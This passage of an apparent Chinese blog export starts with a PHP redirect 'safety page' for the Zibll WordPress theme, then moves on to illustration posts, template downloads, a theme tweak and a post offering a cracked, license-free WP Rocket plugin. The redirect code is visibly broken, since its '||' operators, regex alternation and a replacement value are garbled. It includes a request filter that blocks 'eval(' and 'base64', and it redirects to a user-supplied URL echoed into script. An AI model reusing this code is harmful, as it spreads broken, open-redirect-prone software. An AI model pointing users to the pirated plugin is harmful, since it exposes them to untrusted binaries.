class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (</span><br><span class="line">    strlen($_SERVER[&#x27;REQUEST_URI&#x27;]) &gt; 384 </span><br><span class="line">    strpos($_SERVER[&#x27;REQUEST_URI&#x27;], &quot;eval(&quot;) </span><br><span class="line">    strpos($_SERVER[&#x27;REQUEST_URI&#x27;], &quot;base64&quot;)</span><br><span class="line">) &#123;</span><br><span class="line">@header(&quot;HTTP/1.1 414 Request-URI Too Long&quot;);</span><br><span class="line">@header(&quot;Status: 414 Request-URI Too Long&quot;);</span><br><span class="line">@header(&quot;Connection: Close&quot;);</span><br><span class="line">@exit;</span><br><span class="line">&#125;</span><br><span class="line">//通过QUERY_STRING取得完整的传入数据，然后取得url=之后的所有值，兼容性更好</span><br><span class="line">@session_start();</span><br><span class="line">$t_url = !empty($_SESSION[&#x27;GOLINK&#x27;]) ? $_SESSION[&#x27;GOLINK&#x27;] : preg_replace(&#x27;/^url=(.*)$/i&#x27;, &#x27;k_e_k_c_c_n&#x27;, $_SERVER[&quot;QUERY_STRING&quot;]);</span><br><span class="line">//数据处理</span><br><span class="line">if (!empty($t_url)) &#123;</span><br><span class="line">//判断取值是否加密</span><br><span class="line">if ($t_url == base64_encode(base64_decode($t_url))) &#123;</span><br><span class="line">$t_url = base64_decode($t_url);</span><br><span class="line">&#125;</span><br><span class="line">//防止xss</span><br><span class="line">$t_url = htmlspecialchars($t_url);</span><br><span class="line">//对取值进行网址校验和判断</span><br><span class="line">preg_match(&#x27;/^(httphttpsthunderqqdled2kFlashgetqbrowser):\/\//i&#x27;, $t_url, $matches);</span><br><span class="line">$wiiui_title = get_bloginfo(&#x27;name&#x27;);</span><br><span class="line">$title = $wiiui_title . &#x27; - 安全中心&#x27;;</span><br><span class="line">if ($matches) &#123;</span><br><span class="line">$url = $t_url;</span><br><span class="line">// $title = &#x27;页面加载中,请稍候...&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">preg_match(&#x27;/\./i&#x27;, $t_url, $matche);</span><br><span class="line">if ($matche) &#123;</span><br><span class="line">$url = &#x27;http://&#x27; . $t_url;</span><br><span class="line">// $title = &#x27;页面加载中,请稍候...&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$url = &#x27;http://&#x27; . $_SERVER[&#x27;HTTP_HOST&#x27;];</span><br><span class="line">$title = &#x27;参数错误，正在返回首页...&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$title = &#x27;参数缺失，正在返回首页...&#x27;;</span><br><span class="line">$url = &#x27;http://&#x27; . $_SERVER[&#x27;HTTP_HOST&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">$url = str_replace(&#x27;&amp;&#x27;, &#x27;&amp;&#x27;, $url);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;robots&quot; content=&quot;noindex, nofollow&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;?php echo &quot;&lt;link rel=&#x27;apple-touch-icon-precomposed icon&#x27; href=&#x27;&quot; . _pz(&#x27;iconpng&#x27;) . &quot;&#x27; type=&#x27;image/x-icon&#x27;/&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;noscript&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=&#x27;&lt;?php echo $url; ?&gt;&#x27;;&quot;&gt;</span><br><span class="line">    &lt;/noscript&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function link_jump() &#123;</span><br><span class="line">//禁止其他网站使用我们的跳转页面</span><br><span class="line">var MyHOST = new RegExp(&quot;&lt;?php echo $_SERVER[&#x27;HTTP_HOST&#x27;]; ?&gt;&quot;);</span><br><span class="line">if (!MyHOST.test(document.referrer)) &#123;</span><br><span class="line">location.href = &quot;//&quot; + MyHOST;</span><br><span class="line">&#125;</span><br><span class="line">location.href = &quot;&lt;?php echo $url; ?&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">//延时10S跳转，可自行修改延时时间</span><br><span class="line">setTimeout(link_jump, 10000);</span><br><span class="line">//延时50S关闭跳转页面，用于文件下载后不会关闭跳转页的问题</span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">window.opener = null;</span><br><span class="line">window.close();</span><br><span class="line">&#125;</span><br><span class="line">, 50000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; id=&quot;_fontawesome-css&quot; href=&quot;//cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css&quot; type=&quot;text/css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        &lt;?php echo $title;</span><br><span class="line">?&gt;</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body,html &#123;</span><br><span class="line">padding:0;</span><br><span class="line">margin:0</span><br><span class="line">&#125;</span><br><span class="line">body &#123;</span><br><span class="line">background:#f5f6f7;</span><br><span class="line">font-family:-apple-system,BlinkMacSystemFont,&quot;Segoe UI&quot;,Roboto,Oxygen-Sans,Ubuntu,Cantarell,&quot;Helvetica Neue&quot;,sans-serif</span><br><span class="line">&#125;</span><br><span class="line">a &#123;</span><br><span class="line">cursor:default;</span><br><span class="line">text-decoration:none;</span><br><span class="line">word-wrap:break-word;</span><br><span class="line">word-break:break-all</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-main &#123;</span><br><span class="line">display:flex;</span><br><span class="line">width:100%;</span><br><span class="line">height:100%;</span><br><span class="line">justify-content:center;</span><br><span class="line">align-items:center</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-container &#123;</span><br><span class="line">position: relative;</span><br><span class="line">max-width:28em;</span><br><span class="line">height:auto;</span><br><span class="line">display:inline-block;</span><br><span class="line">background:#fff;</span><br><span class="line">margin:10px;</span><br><span class="line">padding:1.5em;</span><br><span class="line">border-radius:5px;</span><br><span class="line">box-shadow:0 0 10px rgba(116,116,116,.1)</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-content a &#123;</span><br><span class="line">color:#036af4</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-content a:hover &#123;</span><br><span class="line">color:#e91e63</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-logo &#123;</span><br><span class="line">text-align:center;</span><br><span class="line">width:auto;</span><br><span class="line">height:65px;</span><br><span class="line">margin-bottom:10px</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-logo img &#123;</span><br><span class="line">max-width:100%;</span><br><span class="line">height:100%</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-msg &#123;</span><br><span class="line">cursor:default;</span><br><span class="line">text-align:center;</span><br><span class="line">padding:10px 5px;</span><br><span class="line">font-weight:700;</span><br><span class="line">color:rgba(255, 0, 0, 0.85);</span><br><span class="line">background:rgba(255, 0, 0, 0.1);</span><br><span class="line">border-radius:5px</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-button-item &#123;</span><br><span class="line">text-align:right</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-button &#123;</span><br><span class="line">display:inline-block;</span><br><span class="line">border-radius:99px;</span><br><span class="line">padding:10px 15px;</span><br><span class="line">background:rgba(116,116,116,.1);</span><br><span class="line">transition:all .5s</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-button a &#123;</span><br><span class="line">font-weight:700;</span><br><span class="line">font-size:14px;</span><br><span class="line">color:#333</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-button:hover &#123;</span><br><span class="line">color:#000;</span><br><span class="line">background:rgba(116,116,116,.2)</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-goid-item &#123;</span><br><span class="line">position:absolute;</span><br><span class="line">top:10px;</span><br><span class="line">left:10px;</span><br><span class="line">border-radius:4px;</span><br><span class="line">overflow:hidden;</span><br><span class="line">background:#ffd07c</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-goid-title &#123;</span><br><span class="line">padding:0 4px;</span><br><span class="line">background:#ffa400</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-goid-text &#123;</span><br><span class="line">padding-right:5px</span><br><span class="line">&#125;</span><br><span class="line">.wiiuii-go-container hr &#123;</span><br><span class="line">border: 0;</span><br><span class="line">height: 0.05em;</span><br><span class="line">background: #eee;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;wiiuii-go-main&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;wiiuii-go-container&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;wiiuii-goid-item&quot;&gt;</span><br><span class="line">                &lt;b class=&quot;wiiuii-goid-title&quot;&gt;GID&lt;/b&gt;</span><br><span class="line">                &lt;span class=&quot;wiiuii-goid-text&quot;&gt;LINK&lt;?php echo hexdec($url);</span><br><span class="line">?&gt;&lt;/span&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;wiiuii-go-logo&quot;&gt;</span><br><span class="line">                &lt;?php echo zib_get_adaptive_theme_img(_pz(&#x27;logo_src&#x27;), _pz(&#x27;logo_src_dark&#x27;));</span><br><span class="line">?&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;wiiuii-go-content&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;wiiuii-go-msg&quot;&gt;</span><br><span class="line">                    &lt;span&gt;&lt;i class=&quot;fa fa-exclamation-triangle&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt; 您即将离开&lt;?php echo $wiiui_title;</span><br><span class="line">?&gt;，请注意您的账号和财产安全。&lt;/span&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;p&gt;访问链接：&lt;a onclick=&quot;location.replace(&#x27;&lt;?php echo $url; ?&gt;&#x27;)&quot; title=&quot;&lt;?php echo $url; ?&gt;&quot;&gt;&lt;?php echo $url;</span><br><span class="line">?&gt;&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;hr&gt;</span><br><span class="line">            &lt;div class=&quot;wiiuii-go-button-item&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;wiiuii-go-button&quot;&gt;</span><br><span class="line">                    &lt;a onclick=&quot;location.replace(&#x27;//&lt;?php echo $_SERVER[&#x27;HTTP_HOST&#x27;]; ?&gt;&#x27;)&quot;&gt;返回首页&lt;/a&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;wiiuii-go-button&quot;&gt;</span><br><span class="line">                    &lt;a onclick=&quot;location.replace(&#x27;&lt;?php echo $url; ?&gt;&#x27;)&quot;&gt;继续访问&lt;/a&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 子比美化 </tag>
            
            <tag> wordpress </tag>
            
            <tag> 外链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.06pixiv插画分享</title>
      <link href="/1244.html"/>
      <url>/1244.html</url>
      
        <content type="html"><![CDATA[<p>全世界只有不到0.1%的人关注了我</p><p>你可真是个很特别的人~</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-27ae1e7dddcc61a5a69c8f6902ea4594.png"></p><p>1.你永远不知道未来的你 会有什么样的人生 会和什么样的人在一起恋爱 吃的是几块钱的早餐 生活的是几线城市 会给父母怎样的回报 越努力越幸运 你的余生还很长 要坚强地走下去 要做一个优秀的女孩儿 对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒情自卑的自己 既然认准一条路 那就坚持走下去 命运不会辜负每一个对自己认真而努力的人</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-960fac680d2ff3b7301dc328930fe5fa.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6b4f32551998cee588c4b73be3603f22.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-5845d172036d1d2274b5b1970bca2b8e.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-37b10ee4865eb88b14ac26d3e8a6a111.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-6fa8401e6a295b058b35fc143af28820.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9cffbbeb8b1e1de508317012126011ed.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-00a7d67c855ace44764db1db98abd78b.png"></p><p>2.我们总觉得自己还小 还能贪婪的享受所有美好 后来惊讶地发现自己不知从何开始 看得清糖衣里的炮弹 读得出微笑后的杀机 也懂得应付敷衍 逢场作戏 去面对好多自己 不曾想过要面对的事 表面上人畜无害 防身的刀却一直x在身后从未离手那一刻 我终于承认了成长这回事只是不知是好是坏.</p><p>3.不是所有女孩都梦想赚大钱 也不是所有女孩都想做女强人 但当体会过一次次被人肯定认可以后 当你知道自己除了等待还可以争取 当你经济独立自我创造安全感 当你学会了潇洒地笑 潇洒的活着 你会发现 自己爱自己比别人来爱你更有意</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-c3f99c2ea9e515fbb34b1c2430cdad15.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-aadf4585f309776974c58f0c6023bb16.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-d0957623733a096d5462e72b2ccd9a2c.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-735e51afb54abc7b741e2149557b714d.png"></p><p>4.不管什么年纪 别辜负最好的自己！把每一句我不会“都改为我可以学” 把每一句我不敢“都改为我一定行” 尝试总比永远不敢开始要强.</p><p>5.心有所期 全力以赴 定有所成，不要假装努力因为结局不会陪你演戏，跨过星河 迈过月亮 去努力迎接更好的自己 ， 人生那么长，总要用力拼搏一次</p><p>6.生如蝼蚁当立鸿鹄之志，命薄似纸应有不屈之心。乾坤未定，你我皆是黑马。祝你飞黄腾达前程似锦。</p><p>7.总有一天你会明白 你的委屈要自己消化 你的秘密不能逢人就提起 真正能解脱自己的只能靠努力.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-dec9349114ec48863a2a8eb780087596.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-49dce8b5c7c857909a64298a37fad568.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-51b358aedb030bc856157b993a9ed570.png"></p><p>8.对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒憤自卑的自己 我始终相信一句话：只有自己足够强大 才不会被别人践踏.</p><p>9.有压力 但不要被压垮 迷茫但不要绝望 在冷言嘲笑中翻盘 成为别人的可望不可及 你真的努力过了才有资格说你拼过 你可以打败我 但永远也别想让我求饶 生命本该有意义 我们绝不是白来一场 不要指望谁会陪你一辈子 没光的时候连影子都会离开你.</p><p>10.你可以在夜晚里崩溃痛哭 但我希望天一亮你又能顶住来自四面八方的压力 继续生活.</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-b7d431d7f36548c9340992f7575622e5.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-8c1292f09f4f71ef6ff9624f87cd03be.png"></p><p>这期还满意吗❤</p>]]></content>
      
      
      <categories>
          
          <category> 山海图册 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> p站 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 插画 </tag>
            
            <tag> poxiv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Multiverse照片流网页源码分享</title>
      <link href="/a4f51cc.html"/>
      <url>/a4f51cc.html</url>
      
        <content type="html"><![CDATA[<p>老规矩，先看效果图</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/%E7%BD%91%E9%A1%B5%E6%8D%95%E8%8E%B7_6-4-2023_131417_html5up.net_.jpeg"></p><p>multiverse</p><p><a href="https://wwoi.lanzouf.com/iX6D30s893qf">下载</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
            <tag> 源码 </tag>
            
            <tag> HTML </tag>
            
            <tag> 照片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dimension个人引导页源码分享</title>
      <link href="/2f44d508.html"/>
      <url>/2f44d508.html</url>
      
        <content type="html"><![CDATA[<p>先看效果图</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/%E7%BD%91%E9%A1%B5%E6%8D%95%E8%8E%B7_6-4-2023_131215_html5up.net_.jpeg"></p><p>dimension</p><p><a href="https://wwoi.lanzouf.com/is57T0s88rkh">下载</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
            <tag> 源码 </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Massively HTML5+CSS源码</title>
      <link href="/7ed6edbb.html"/>
      <url>/7ed6edbb.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/%E7%BD%91%E9%A1%B5%E6%8D%95%E8%8E%B7_6-4-2023_1325_html5up.net_-scaled.jpeg"></p><p>massively</p><p><a href="https://wwoi.lanzouf.com/iWgOm0s88f1g">下载</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML5 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子比主题自定义博主标识</title>
      <link href="/1193.html"/>
      <url>/1193.html</url>
      
        <content type="html"><![CDATA[<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-3.png" alt="image"></p><h2 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h2><p>找到 wp-content&#x2F;themes&#x2F;zibll&#x2F;inc&#x2F;functions&#x2F;zib-comments-list.php</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-4-1024x549.png" alt="image"></p><p>替换成下面这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg t=&quot;1653902014495&quot; class=&quot;icon&quot; viewBox=&quot;0 0 1194 1024&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; p-id=&quot;736&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;path d=&quot;M980.282449 0q91.926387 2.656832 151.173741 61.992747t61.992747 151.173741v596.635908q-2.656832 91.926387-61.992747 151.173741t-151.173741 61.992746H213.077927q-91.926387-2.656832-151.173741-61.992746T0 809.802396V213.077927Q2.656832 121.151539 61.992747 61.992747t151.08518-61.992747z m-507.454913 554.038034a229.284602 229.284602 0 0 1-15.321065 97.94854C445.550727 681.920215 413.757304 697.418402 362.303325 699.632428c-51.542541-1.859782-83.247403-17.712213-95.291708-47.291609a229.284602 229.284602 0 0 1-15.321065-97.94854V263.734857h-81.210498v324.930555q0 94.583219 48.620025 141.16634t139.217998 45.963194q90.50941-0.619927 142.494756-48.620026t53.13664-143.823172V263.734857h-81.121937z m387.543229-290.303177H652.606502v503.469665h79.70496V571.396003h128.059303q99.896883-3.985248 132.8416-53.13664a163.483729 163.483729 0 0 0 29.933641-99.896883 166.760489 166.760489 0 0 0-29.933641-99.896884q-32.944717-50.745491-132.8416-54.730739z m-3.985248 239.734808h-123.985494V340.960107h123.985494a84.133014 84.133014 0 0 1 56.590521 16.649481c15.586748 11.955744 23.734366 33.564644 24.708538 64.561018-0.974172 29.313713-9.564595 50.214125-26.036954 62.612674a88.561067 88.561067 0 0 1-55.262105 18.686385z&quot; p-id=&quot;737&quot; fill=&quot;#fb7299&quot;&gt;&lt;/path&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 子比美化 </tag>
            
            <tag> 标识 </tag>
            
            <tag> 魔改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【WP Rocket v3.10.4】WordPress火箭缓存插件+免授权+破解版+汉化版+预加载链接</title>
      <link href="/f273a1cd.html"/>
      <url>/f273a1cd.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-2-1024x667.png"></p><h2 id="源码简介"><a href="#源码简介" class="headerlink" title="源码简介"></a>源码简介</h2><p>新功能：延迟JavaScript执行-通过延迟JavaScript文件的加载直到用户交互（例如，滚动，单击）来提高性能<br>新功能：预加载链接-在用户单击链接之前预取页面，以提高感知的加载速度和用户体验）<br>增强功能：启用“最小化CSS &#x2F; JS”选项后，在本地托管和最小化第三方CSS和JS文件<br>增强功能：自动将font-display：swap添加到包含字体的CSS文件中，以缩短渲染时间<br>增强功能：启用合并CSS时，将第三方CSS文件合并到合并的CSS文件中<br>增强功能：现在自动启用并应用了“优化Google字体”选项<br>增强功能：使用与WP Rocket相同的库，保护我们的代码免受与其他插件的冲突。<br>增强功能：使用专用查询字符串绕过WP Rocket的问题进行故障排除（＃2576）<br>删除选项：删除minify HTML选项，因为它对加载时间和文件大小的影响可以忽略不计<br>错误修正：防止PHP通知与未定义的变量$ home_root_length相关<br>错误修正：在某些情况下使用“优化Google字体”可防止发生PHP致命错误</p><p>WP Rocket v3.10.4</p><p><a href="https://wwoi.lanzouf.com/iDW5W0s7y9hg">下载</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wordpress </tag>
            
            <tag> 缓存插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>万物随春醒，庭院柳色新，欢迎来刀塔世界踏青</title>
      <link href="/e7821895.html"/>
      <url>/e7821895.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-4f69b6930fd836e293320c2d57b63f06.png"></p><p>两年前的昨天，iG在新加坡Major总决赛上让二追三，完成了史无前例的翻盘夺冠。而如今其中的四人披着不同的战袍，有人留守有人回家，有人苦尽甘来有人临危受命，再相逢时是友亦是敌，4月26日至5月7日，柏林Major见。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-11e583b546fbb17b6f0ee6ba4ec368c4.png"></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dota2 </tag>
            
            <tag> 比赛 </tag>
            
            <tag> 清明 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.05pixiv插画分享</title>
      <link href="/1172.html"/>
      <url>/1172.html</url>
      
        <content type="html"><![CDATA[<p>全世界只有不到0.1%的人关注了我</p><p>你可真是个很特别的人~</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-0d5a8a68c0ed29fbc4089a111b74f438.png"></p><p>1.你永远不知道未来的你 会有什么样的人生 会和什么样的人在一起恋爱 吃的是几块钱的早餐 生活的是几线城市 会给父母怎样的回报 越努力越幸运 你的余生还很长 要坚强地走下去 要做一个优秀的女孩儿 对自己狠一点 逼自己努力 再过五年 你将会感谢今天发狠的自己 恨透今天懒情自卑的自己 既然认准一条路 那就坚持走下去 命运不会辜负每一个对自己认真而努力的人</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-80e1ba1ff2d2af1c5cdc5928a369a595.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-be6b08f86473f31a48c0964ad7052709.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-a9a8c17671fee3769c76a3863d08c1f1.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-4593dbbb2d3b911470ae393c03e6cc03.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-7e1a6f291ff22fdf69bfe6a3d317633e.png"></p><p>2.我们总觉得自己还小 还能贪婪的享受所有美好 后来惊讶地发现自己不知从何开始 看得清糖衣里的炮弹 读得出微笑后的杀机 也懂得应付敷衍 逢场作戏 去面对好多自己 不曾想过要面对的事 表面上人畜无害 防身的刀却一直x在身后从未离手那一刻 我终于承认了成长这回事只是不知是好是坏.</p><p>3.不是所有女孩都梦想赚大钱 也不是所有女孩都想做女强人 但当体会过一次次被人肯定认可以后 当你知道自己除了等待还可以争取 当你经济独立自我创造安全感 当你学会了潇洒地笑 潇洒的活着 你会发现 自己爱自己比别人来爱你更有意</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-58ef81d528c9461d3aa89bc4f4dceece.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-7f500d01c4677cd7f8296e382230fb3d.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-75c2779418a64f6ab5bf9b6c03520793.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-f19ce5f18d8ab3aba6885f27574c7cbb.png"></p><p><img 